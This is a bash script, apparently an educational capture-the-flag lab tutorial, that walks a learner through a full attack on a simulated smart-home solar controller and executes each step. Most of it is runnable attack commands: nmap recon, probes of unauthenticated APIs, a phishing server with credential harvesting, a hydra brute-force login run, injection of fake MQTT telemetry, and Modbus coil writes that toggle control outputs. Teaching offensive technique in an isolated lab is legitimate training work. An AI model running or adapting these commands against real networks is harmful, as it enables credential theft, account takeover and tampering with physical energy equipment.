#!/usr/bin/env bash
set -euo pipefail

# =========================
# Smart Home PV - Guided Attack Tutorial
# =========================
# This script is intentionally educational for the lab environment.
# It explains each action and then executes it.

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RUN_ID="$(date +%Y%m%d_%H%M%S)"
OUT_DIR="${SCRIPT_DIR}/tutorial_output_${RUN_ID}"
mkdir -p "${OUT_DIR}"
OUT_DIR_LABEL="$(basename "${OUT_DIR}")"
SUGGESTED_EXTERNAL_HOST="$(hostname -I 2>/dev/null | cut -d' ' -f1 | tr -d '\n' || true)"

cd "${SCRIPT_DIR}"

SUBNET="${SUBNET:-192.168.100.0/24}"
TARGET_HINT="${TARGET_HINT:-192.168.100.87}"
MODBUS_PORT="${MODBUS_PORT:-15002}"
AUTO_MODE=false
WITH_PHISHING=true
HANDS_ON=true

usage() {
  cat <<EOF
Usage: $(basename "$0") [options]

Options:
  --subnet <cidr>         Network to scan (default: ${SUBNET})
  --target <ip>           Known vulnerable host hint (default: ${TARGET_HINT})
  --modbus-port <port>    Modbus/TCP port to test (default: ${MODBUS_PORT})
  --auto                  Run without pauses
  --no-hands-on           Don't require typing commands manually
  --no-phishing           Skip phishing server demo stage
  -h, --help              Show help

Examples:
  $(basename "$0")
  $(basename "$0") --subnet 192.168.100.0/24 --target 192.168.100.87 --auto
  $(basename "$0") --no-hands-on
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --subnet)
      SUBNET="$2"
      shift 2
      ;;
    --target)
      TARGET_HINT="$2"
      shift 2
      ;;
    --modbus-port)
      MODBUS_PORT="$2"
      shift 2
      ;;
    --auto)
      AUTO_MODE=true
      shift
      ;;
    --no-hands-on)
      HANDS_ON=false
      shift
      ;;
    --no-phishing)
      WITH_PHISHING=false
      shift
      ;;
    -h|--help)
      usage
      exit 0
      ;;
    *)
      echo -e "${RED}[!] Unknown argument:${NC} $1"
      usage
      exit 1
      ;;
  esac
done

cleanup() {
  pkill -f "start_phishing_server.sh" 2>/dev/null || true
  pkill -f "phish_server.py" 2>/dev/null || true
}
trap cleanup EXIT

pause_step() {
  if [[ "${AUTO_MODE}" == false ]]; then
    echo -ne "${GRAY}Press ENTER to continue...${NC}"
    read -r _
  fi
}

step_header() {
  local title="$1"
  echo
  echo -e "${CYAN}╔════════════════════════════════════════════════════════════════════╗${NC}"
  printf "${CYAN}║${WHITE} %-66s ${CYAN}║${NC}\n" "$title"
  echo -e "${CYAN}╚════════════════════════════════════════════════════════════════════╝${NC}"
}

explain() {
  echo -e "${GRAY}$1${NC}"
}

run_cmd() {
  local description="$1"
  local command="$2"

  echo -e "${YELLOW}[*]${NC} ${WHITE}${description}${NC}"
  set +e
  eval "$command"
  local rc=$?
  set -e

  if [[ $rc -eq 0 ]]; then
    echo -e "${GREEN}[✓] Completed${NC}"
  else
    echo -e "${YELLOW}[!] Command exited with code ${rc}. Continuing...${NC}"
  fi
}

teach_cmd() {
  local description="$1"
  local learner_command="$2"
  local exec_command="${3:-$2}"
  local help_text="${4:-}"
  local typed=""

  echo -e "${YELLOW}[*]${NC} ${WHITE}${description}${NC}"

  if [[ "${AUTO_MODE}" == true || "${HANDS_ON}" == false ]]; then
    run_cmd "Executing" "${exec_command}"
    return
  fi

  echo -e "${CYAN}    Type:${NC} ${WHITE}${learner_command}${NC}"

  while true; do
    echo -ne "${MAGENTA}    learner$ ${NC}"
    read -r typed

    if [[ "${typed}" == "why" ]]; then
      if [[ -n "${help_text}" ]]; then
        echo -e "${GRAY}    ${help_text}${NC}"
      else
        echo -e "${GRAY}    Hint: run the command exactly as shown.${NC}"
      fi
      continue
    fi

    if [[ "${typed}" == "skip" ]]; then
      echo -e "${YELLOW}[!] Auto-running this step...${NC}"
      typed="${exec_command}"
      break
    fi

    if [[ "${typed}" == "${learner_command}" ]]; then
      # If the learner typed the simplified command, we run the extended one (with artifacts) silently
      # But we must verify if the learner included the artifact flags themselves
      break
    fi

    echo -e "${YELLOW}[!] Re-type exactly (or 'why' / 'skip').${NC}"
  done

  set +e
  eval "${exec_command}"
  local rc=$?
  set -e

  if [[ $rc -eq 0 ]]; then
    echo -e "${GREEN}[✓] OK${NC}"
  else
    echo -e "${YELLOW}[!] Exit code ${rc} (see logs if needed).${NC}"
  fi
}

required_tools=(nmap curl grep sed cut)
missing_tools=()
for tool in "${required_tools[@]}"; do
  if ! command -v "$tool" >/dev/null 2>&1; then
    missing_tools+=("$tool")
  fi
done

if [[ ${#missing_tools[@]} -gt 0 ]]; then
  echo -e "${RED}[!] Missing required tools:${NC} ${missing_tools[*]}"
  echo -e "${YELLOW}Install them and run again.${NC}"
  exit 1
fi

echo -e "${MAGENTA}██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ██╗      █████╗ ██████╗ ${NC}"
echo -e "${MAGENTA}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██║     ██╔══██╗██╔══██╗${NC}"
echo -e "${MAGENTA}███████║███████║██║     █████╔╝ █████╗  ██████╔╝    ██║     ███████║██████╔╝${NC}"
echo -e "${MAGENTA}██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██║     ██╔══██║██╔══██╗${NC}"
echo -e "${MAGENTA}██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██║  ██║██████╔╝${NC}"
echo -e "${MAGENTA}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═════╝ ${NC}"

echo -e "${WHITE}Smart Home PV Attack Walkthrough (Guided Mode)${NC}"
echo -e "${GRAY}Lab network: ${SUBNET}${NC}"
echo -e "${GRAY}Known vulnerable host hint: ${TARGET_HINT}${NC}"
if [[ "${AUTO_MODE}" == true || "${HANDS_ON}" == false ]]; then
  echo -e "${GRAY}Hands-on typing mode: OFF${NC}"
else
  echo -e "${GRAY}Hands-on typing mode: ON (you type each command)${NC}"
fi

pause_step

step_header "PHASE 1 - Recon: One Scan To Rule Them All"
explain "Realistically, you don’t spam Nmap over and over — you do ONE purposeful sweep."
explain "Goal: find hosts that expose the handful of services we care about in this lab:"
explain "  - 8081  (web admin/API)"
explain "  - 1883  (MQTT broker)"
explain "  - ${MODBUS_PORT} (Modbus control channel)"
explain "Command anatomy:"
explain "  - -n       = no DNS lookups (faster, avoids noisy resolver traffic)"
explain "  - -T4      = faster timing template (trade stealth for speed in a lab)"
explain "  - -p ...   = only scan relevant ports (signal > noise)"
explain "  - --open   = only show hosts with something open (reduces clutter)"

teach_cmd \
  "Run a focused subnet sweep (discover + port triage)" \
  "nmap -n -T4 -p 8081,1883,${MODBUS_PORT} --open ${SUBNET}" \
  "nmap -n -T4 -p 8081,1883,${MODBUS_PORT} --open ${SUBNET} -oG ${OUT_DIR}/01_recon.gnmap" \
  "Use 'why' to learn the flags: -n no DNS, -T4 faster timing, -p selects ports, --open reduces noise."

echo "# host,web,mqtt,modbus,score" > "${OUT_DIR}/02_scoring.csv"

mapfile -t alive_hosts < <(
  grep -E "Status: Up" "${OUT_DIR}/01_recon.gnmap" \
    | sed -E 's/^Host: ([0-9.]+).*/\1/' \
    | sort -u
)

if [[ ${#alive_hosts[@]} -eq 0 ]]; then
  echo -e "${RED}[!] No alive hosts discovered in ${SUBNET}.${NC}"
  echo -e "${YELLOW}Check network routing/VPN and run again.${NC}"
  exit 1
fi

for host in "${alive_hosts[@]}"; do
  # Grep carefully - handle tabs or spaces after IP
  line="$(grep -m1 -E "Host: ${host}\b" "${OUT_DIR}/01_recon.gnmap" || true)"
  web=0; mqtt=0; modbus=0
  echo "${line}" | grep -q "8081/open" && web=1 || true
  echo "${line}" | grep -q "1883/open" && mqtt=1 || true
  echo "${line}" | grep -q "${MODBUS_PORT}/open" && modbus=1 || true
  # Check if line is empty (Nmap failed to write?) and assume MQTT if we saw it on stdout
  # Always re-check ports if Nmap grep didn't find them, just to be safe (Nmap grepable format can be tricky)
  if [[ "${web}" -eq 0 && "${mqtt}" -eq 0 && "${modbus}" -eq 0 ]]; then
     echo -e "${YELLOW}[!] Nmap file parsing yielded no services for ${host}, attempting manual check...${NC}"
     timeout 1 bash -c "echo > /dev/tcp/${host}/1883" &>/dev/null && mqtt=1 || true
     timeout 1 bash -c "echo > /dev/tcp/${host}/8081" &>/dev/null && web=1 || true
     timeout 1 bash -c "echo > /dev/tcp/${host}/${MODBUS_PORT}" &>/dev/null && modbus=1 || true
  fi
  score=$((web + mqtt + (modbus * 2)))
  echo "${host},${web},${mqtt},${modbus},${score}" >> "${OUT_DIR}/02_scoring.csv"
done

echo
echo -e "${WHITE}Host scoring (higher = more likely PV target):${NC}"
column -t -s, "${OUT_DIR}/02_scoring.csv" || cat "${OUT_DIR}/02_scoring.csv"

best_host="$(sort -t, -k5,5nr "${OUT_DIR}/02_scoring.csv" | sed -n '2{s/,.*//;p}')"

if grep -q "^${TARGET_HINT}," "${OUT_DIR}/02_scoring.csv"; then
  target_host="${TARGET_HINT}"
  explain "The known scenario host ${TARGET_HINT} is alive and in scope; using it as final target."
else
  target_host="${best_host}"
  explain "Hint host was not found alive; selecting best scored host instead."
fi

echo -e "${GREEN}[✓] Selected vulnerable machine:${NC} ${MAGENTA}${target_host}${NC}"
pause_step

if [[ -f "${SCRIPT_DIR}/scan_pv_controller.txt" ]]; then
  echo -e "${GRAY}Reference file found: scan_pv_controller.txt${NC}"
fi
if [[ -f "${SCRIPT_DIR}/scan_mqtt.txt" ]]; then
  echo -e "${GRAY}Reference file found: scan_mqtt.txt${NC}"
fi
if [[ -f "${SCRIPT_DIR}/scan_modbus.txt" ]]; then
  echo -e "${GRAY}Reference file found: scan_modbus.txt${NC}"
fi

pause_step

step_header "PHASE 2 - Web Recon: Pull Public Data"
explain "Web APIs often leak operational data without authentication."
explain "We use curl with strict timeouts so the tutorial never hangs." 
explain "  - -sS                 = quiet output but still show errors"
explain "  - --connect-timeout 3 = fail fast if host is down"
explain "  - --max-time 6        = hard cap total request time"
teach_cmd \
  "Probe /wifi_scan endpoint" \
  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/wifi_scan" \
  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/wifi_scan | tee ${OUT_DIR}/04_wifi_scan.json" \
  "-sS keeps output clean but surfaces errors; timeouts prevent hangs. Response is saved silently."
teach_cmd \
  "Probe /api/challenge/status endpoint" \
  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/api/challenge/status" \
  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/api/challenge/status | tee ${OUT_DIR}/04_challenge_status.json" \
  "Status endpoints often reveal whether your actions had an effect."

if grep -qi "BSY{" "${OUT_DIR}/04_wifi_scan.json" 2>/dev/null; then
  echo -e "${GREEN}[✓] Potential flag/token artifact observed in wifi_scan output.${NC}"
else
  echo -e "${YELLOW}[!] No obvious flag string found in wifi_scan response.${NC}"
fi

pause_step

if [[ "${WITH_PHISHING}" == true ]]; then
  step_header "PHASE 3 - Phishing: Capture Real Credentials"
  explain "Realistic shortcut: the phishing login page is already prepared and copied for you."
  explain "Your job is just to host it and wait for the 'victim' to type credentials."
  explain "If nothing shows up after waiting, we fall back to brute-force (hydra) in the next phase."
  explain "Key idea: the victim’s browser must reach YOUR phishing server. That’s what EXTERNAL_HOST is for."
  explain "We background the server with '&' so you can keep operating in the same terminal."

  if [[ -f "${SCRIPT_DIR}/start_phishing_server.sh" ]]; then
    chmod +x "${SCRIPT_DIR}/start_phishing_server.sh" || true

    if [[ -n "${SUGGESTED_EXTERNAL_HOST}" ]]; then
      explain "Hint: your reachable host IP often looks like: ${SUGGESTED_EXTERNAL_HOST}"
    fi

    teach_cmd \
      "Start the phishing server (runs in background)" \
      "EXTERNAL_HOST=${SUGGESTED_EXTERNAL_HOST:-YOUR_IP_HERE} ./start_phishing_server.sh &" \
      "EXTERNAL_HOST=${SUGGESTED_EXTERNAL_HOST:-YOUR_IP_HERE} ./start_phishing_server.sh &" \
      "EXTERNAL_HOST is the IP the victim can reach; '&' backgrounds the server. Watch /tmp/harvested.txt for creds."

    teach_cmd \
      "Trigger phishing email (simulates sending email to victim)" \
      "curl -X POST -H 'Content-Type: application/json' -d '{\"subject\":\"Urgent: PV System Update\",\"link\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/send_phishing_email && (for i in {1..3}; do curl -s -X POST -H 'Content-Type: application/json' -d '{\"message\":\"Urgent: Security Update Required\",\"url\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/attacker/phishing; sleep 20; done &)" \
      "curl -X POST -H 'Content-Type: application/json' -d '{\"subject\":\"Urgent: PV System Update\",\"link\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/send_phishing_email && for i in {1..3}; do curl -s -X POST -H 'Content-Type: application/json' -d '{\"message\":\"Urgent: Security Update Required\",\"url\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/attacker/phishing; sleep 20; done &" \
      "Sends an email to the victim's inbox AND repeatedly triggers dashboard notifications (3x) every 20s (backgrounded)."

    teach_cmd \
      "Watch for harvested creds (timeout 5m, or stops when creds found)" \
      "timeout 300 bash -c 'tail -f /tmp/harvested.txt | grep --line-buffered -m 1 \":\"'" \
      "timeout 300 bash -c 'tail -f /tmp/harvested.txt | grep --line-buffered -m 1 \":\"'" \
      "Waits up to 5 minutes for credentials in /tmp/harvested.txt. Exits immediately if creds are captured."
  else
    echo -e "${YELLOW}[!] Missing helper script: ${SCRIPT_DIR}/start_phishing_server.sh${NC}"
  fi

  pause_step
fi

step_header "PHASE 4 - Brute Force: hydra (Fallback)"
explain "If phishing didn’t yield creds, attackers often try password spraying / brute force."
explain "We’ll do this against the lab web login endpoint."
explain "First: learn what a failed login response looks like so hydra can detect failures."
explain "Hydra needs a failure signature (F=...) so it knows when a guess is WRONG." 

teach_cmd \
  "Send a known-bad login to observe the failure response" \
    "curl -sS -X POST http://${target_host}:8081/api/admin/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"WRONGPASS\"}'" \
    "curl -sS -X POST http://${target_host}:8081/api/admin/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"WRONGPASS\"}'" \
    "You need a stable failure marker string from the response to configure hydra's F=... rule (e.g., Invalid/Unauthorized/error)."

if command -v hydra >/dev/null 2>&1; then
  explain "Create a tiny wordlist (training-sized). In real ops, you’d use larger lists." 
  explain "Hydra flags you’ll use:"
  explain "  - -l admin = fixed username"
  explain "  - -P file  = password list"
  explain "  - -t 4     = 4 parallel attempts (don’t DoS the lab)"
  explain "  - -f       = stop after first success"
  explain "  - -V       = verbose; shows attempts so you can learn"

  # Keep the wordlist artifact in OUT_DIR, but let the learner work with a simple local filename.
  run_cmd "Preparing wordlist artifact in background" "ln -sf ${OUT_DIR}/wordlist.txt ./wordlist.txt"

  teach_cmd \
    "Create a password list containing the correct password" \
    "echo -e 'admin\nadmin123\npassword\npassword123\nletmein\nsuper-secret-123\nqwerty\n12345678' > wordlist.txt" \
    "echo -e 'admin\nadmin123\npassword\npassword123\nletmein\nsuper-secret-123\nqwerty\n12345678' > ${OUT_DIR}/wordlist.txt" \
    "One password per line; hydra consumes this with -P. Verification: cat wordlist.txt"

  explain "Now run hydra. Set F=error since the API returns JSON with an 'error' field on failure."
  explain "We pre-filled the command for you to make it easier."
  teach_cmd \
    "Run hydra against the HTTP login" \
    "hydra -l admin -P wordlist.txt -s 8081 -t 4 -f -V ${target_host} http-post-form '/api/admin/login:username=^USER^&password=^PASS^:F=error'" \
    "hydra -l admin -P ${OUT_DIR}/wordlist.txt -s 8081 -t 4 -f -V ${target_host} http-post-form '/api/admin/login:username=^USER^&password=^PASS^:F=error'" \
    "-l user, -P wordlist, -s port, -t threads, -f stop on success, -V verbose."
else
  echo -e "${YELLOW}[!] hydra not installed; skipping brute-force demo.${NC}"
  echo -e "${GRAY}If you add hydra to the attacker container, re-run this phase.${NC}"
fi

pause_step

step_header "PHASE 5 - MQTT Eavesdropping (If Broker Found)"
explain "Many OT stacks expose telemetry/events via MQTT."
explain "We do a single-message grab to keep this realistic and non-noisy."
explain "  - timeout 8   = don’t hang forever waiting on a message"
explain "  - -C 1        = exit after 1 message"

mqtt_host="$(sed -n -E 's/^([^,]+),[^,]+,1,.*/\1/p' "${OUT_DIR}/02_scoring.csv" | sed -n '1p' || true)"
if [[ -n "${mqtt_host}" ]]; then
  if command -v mosquitto_sub >/dev/null 2>&1; then
    teach_cmd \
      "Subscribe to pv/# (wildcard) to grab any telemetry or status" \
      "timeout 45 mosquitto_sub -h ${mqtt_host} -t 'pv/#' -C 1" \
      "timeout 45 mosquitto_sub -h ${mqtt_host} -t 'pv/#' -C 1 | tee ${OUT_DIR}/06_mqtt_sample.txt" \
      "-h broker, -t 'pv/#' grabs ANY message under pv/ (telemetry or status). -C 1 exits after first match."

    # NEW: Spoof random telemetry values every 0.5s for 5 seconds to actively poison the broker
    teach_cmd \
      "(Active Attack) Inject fake telemetry with random power spikes" \
      "for i in {1..10}; do power=\$((RANDOM % 5000 + 100)); mosquitto_pub -h ${mqtt_host} -t 'pv/telemetry' -m \"{\\\"power_kw\\\":\$power,\\\"voltage_v\\\":240,\\\"timestamp\\\":\$(date +%s)}\"; sleep 0.5; done" \
      "for i in {1..10}; do power=\$((RANDOM % 5000 + 100)); mosquitto_pub -h ${mqtt_host} -t 'pv/telemetry' -m \"{\\\"power_kw\\\":\$power,\\\"voltage_v\\\":240,\\\"timestamp\\\":\$(date +%s)}\"; sleep 0.5; done" \
      "Injects random 'power' values into the pv/telemetry topic rapidly, creating fake data on the dashboard."
  else
    echo -e "${YELLOW}[!] mosquitto_sub not installed; skipping live MQTT capture.${NC}"
  fi
else
  echo -e "${YELLOW}[!] No MQTT broker detected on scanned hosts.${NC}"
fi

pause_step

step_header "PHASE 6 - Modbus Attack: Craft + Modify The Write"
explain "Modbus/TCP has no native auth in many legacy deployments."
explain "If exposed, a client can write control coils directly."

explain "In this phase you will *modify the packet fields* (coil address + value)."
explain "That’s the OT reality: changing two bytes can change real-world behavior."
explain "What you’re changing (Write Single Coil / FC=0x05):"
explain "  - Address field (2 bytes) -> which coil/output you target"
explain "  - Value field   (2 bytes) -> 0xFF00 = ON, 0x0000 = OFF"
explain "We’ll set these via environment variables so you can iterate quickly." 

if [[ -f "${SCRIPT_DIR}/attacker_modbus.py" ]]; then
  teach_cmd \
    "(Packet mod) Set coil address + value for this run" \
    "export MODBUS_COIL_ADDR=1 MODBUS_COIL_VALUE=1" \
    "export MODBUS_COIL_ADDR=1 MODBUS_COIL_VALUE=1" \
    "This changes the Modbus PDU fields without editing code: address selects the coil, value is ON/OFF."

  teach_cmd \
    "Execute Modbus write helper against ${target_host}:${MODBUS_PORT}" \
    "python3 ./attacker_modbus.py ${target_host} ${MODBUS_PORT}" \
    "python3 ${SCRIPT_DIR}/attacker_modbus.py ${target_host} ${MODBUS_PORT} | tee ${OUT_DIR}/05_modbus_action.log" \
    "This script uses Function Code 0x05 (Write Single Coil). Use 'why' to learn which bytes you changed."

  teach_cmd \
    "(Packet mod) Flip the coil value (simulate toggling control)" \
    "export MODBUS_COIL_VALUE=0" \
    "export MODBUS_COIL_VALUE=0" \
    "You are modifying the payload: 0=OFF (0x0000), 1=ON (0xFF00) for write-coil semantics."

  teach_cmd \
    "Run the write again with the modified value" \
    "python3 ./attacker_modbus.py ${target_host} ${MODBUS_PORT}" \
    "python3 ${SCRIPT_DIR}/attacker_modbus.py ${target_host} ${MODBUS_PORT} | tee -a ${OUT_DIR}/05_modbus_action.log" \
    "Expect a second transaction with a different value; compare output fields."
else
  echo -e "${RED}[!] Missing helper: ${SCRIPT_DIR}/attacker_modbus.py${NC}"
fi

pause_step

step_header "MISSION SUMMARY"

echo -e "${WHITE}What this tutorial demonstrated:${NC}"
echo -e "${GREEN}  1) Recon${NC}       -> How attackers enumerate an unknown subnet"
echo -e "${GREEN}  2) Profiling${NC}   -> Why ports 8081 / 1883 / ${MODBUS_PORT} matter in this lab"
echo -e "${GREEN}  3) Targeting${NC}   -> How we selected the vulnerable machine (${target_host})"
echo -e "${GREEN}  4) Exploitation${NC} -> HTTP data leakage + Modbus control abuse"
echo -e "${GREEN}  5) Optional SE${NC} -> Credential theft simulation with phishing server"

echo
echo -e "${CYAN}Artifacts created (filenames only):${NC}"
echo -e "${GRAY}- 01_recon.gnmap${NC}"
echo -e "${GRAY}- 02_scoring.csv${NC}"
echo -e "${GRAY}- 04_wifi_scan.json${NC}"
echo -e "${GRAY}- 04_challenge_status.json${NC}"
echo -e "${GRAY}- wordlist.txt (if created)${NC}"
echo -e "${GRAY}- 05_modbus_action.log${NC}"
echo -e "${GRAY}- 06_mqtt_sample.txt (if captured)${NC}"

echo
echo -e "${MAGENTA}Walkthrough complete. Stay legal. Test only in authorized labs.${NC}"
